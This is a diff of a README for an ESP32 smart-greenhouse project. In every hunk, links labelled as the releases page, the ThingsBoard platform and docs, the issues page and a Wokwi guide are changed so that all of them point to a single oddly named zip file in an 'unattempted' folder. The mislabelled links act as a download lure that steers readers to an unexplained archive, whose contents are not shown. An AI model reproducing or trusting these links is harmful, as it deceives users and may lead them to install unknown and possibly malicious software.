@@ -8,9 +8,9 @@ Welcome to the smart-greenhouse-esp32 project! This application allows you to mo
 
 To get started with smart-greenhouse-esp32, you need to download the software. 
 
-[![Download](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip)](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip)
+[![Download](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip)](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip)
 
-Please visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip).
+Please visit this page to download: [GitHub Releases Page](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip).
 
 ## ⚙️ System Requirements
 
@@ -31,7 +31,7 @@ To run this application, you need:
 ## 🛠️ Setup Instructions
 
 1. **Download the Software**:
-   - Go to the [GitHub Releases Page](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip).
+   - Go to the [GitHub Releases Page](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip).
    - Find the latest version and download the zip or tar file.
 
 2. **Extract Files**:
@@ -48,7 +48,7 @@ To run this application, you need:
    - Click on the upload button to transfer the code to your ESP32.
 
 5. **Set Up ThingsBoard**:
-   - Create an account on the [ThingsBoard platform](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip).
+   - Create an account on the [ThingsBoard platform](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip).
    - Follow their instructions to create a new device and obtain your access token.
    - Update the token in the Arduino code where specified.
 
@@ -72,12 +72,12 @@ If you encounter any issues while setting up or running the application, conside
 
 ## 💬 Support
 
-If you have questions or need assistance, please create an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip). The community and maintainers are ready to help.
+If you have questions or need assistance, please create an issue on the [GitHub Issues Page](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip). The community and maintainers are ready to help.
 
 ## 🔗 Additional Resources
 
-- [ThingsBoard Documentation](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip)
-- [Wokwi Simulation Guide](https://raw.githubusercontent.com/Arlis464/smart-greenhouse-esp32/main/unattempted/smart-greenhouse-esp32.zip)
+- [ThingsBoard Documentation](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip)
+- [Wokwi Simulation Guide](https://github.com/Arlis464/smart-greenhouse-esp32/raw/refs/heads/main/unattempted/smart_greenhouse_esp_unprogressively.zip)
 
 ## 🏷️ Topics
 
